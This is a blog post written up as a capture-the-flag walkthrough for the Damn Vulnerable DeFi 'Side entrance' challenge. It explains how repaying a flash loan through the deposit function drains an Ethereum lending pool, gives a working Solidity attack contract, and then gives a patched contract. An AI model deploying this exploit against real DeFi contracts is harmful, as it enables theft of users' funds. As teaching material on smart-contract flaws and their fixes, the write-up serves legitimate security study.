---
layout: post
title: Damn Vulnerable DeFi - Side entrance
---

## Description
A surprisingly simple lending pool allows anyone to deposit ETH, and withdraw it at any point in time.

This very simple lending pool has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.

You must take all ETH from the lending pool.

## Solution
Ah nice, another flash loan contract! If the name is any indication, we'll have to enter the
contract is an unexpected way. The first thing to catch your eye should be the `deposit()`
function. Can we take out a flash loan and then use those funds to perform a deposit?

If we flash loan `X` amount and then deposit `X`, as far as the flash loan contract is
concerned, we've returned the loan (i.e. `address(this).balance >= balanceBefore`). But
we've also incremented the attacker's balance. Then we can call `withdraw` for free monies!!!

```
contract SideEntranceAttack is IFlashLoanEtherReceiver {
    SideEntranceLenderPool private pool;

    function attack(SideEntranceLenderPool _pool) external {
        pool = _pool;
        // execute() will be called by the loaner between
        // _pool.flashLoan and _pool.withdraw()
        _pool.flashLoan(address(pool).balance);
        _pool.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    // Called by the flash loaner
    function execute() override external payable {
        pool.deposit{value: msg.value}();
    }

    // Need this so the flash loaner doesn't revert when it tries
    // to send us ether
    receive() external payable {}
}
```

## Patched Contract
This is a classic reentrancy attack, and we can fix it by making `deposit` and `flashLoan`
non-reentrant. Heck, we'll throw the modifier on `withdraw` too just for safe measure!

```
contract SideEntranceLenderPoolV2 is ReentrancyGuard {
    using Address for address payable;

    mapping (address => uint256) private balances;

    function deposit() external payable nonReentrant {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external nonReentrant {
        uint256 amountToWithdraw = balances[msg.sender];
        balances[msg.sender] = 0;
        payable(msg.sender).sendValue(amountToWithdraw);
    }

    function flashLoan(uint256 amount) external nonReentrant {
        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= amount, "Not enough ETH in balance");
        
        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");        
    }
}
```

You can verify yourself that the exploit no longer works with `SideEntranceLenderPoolV2`!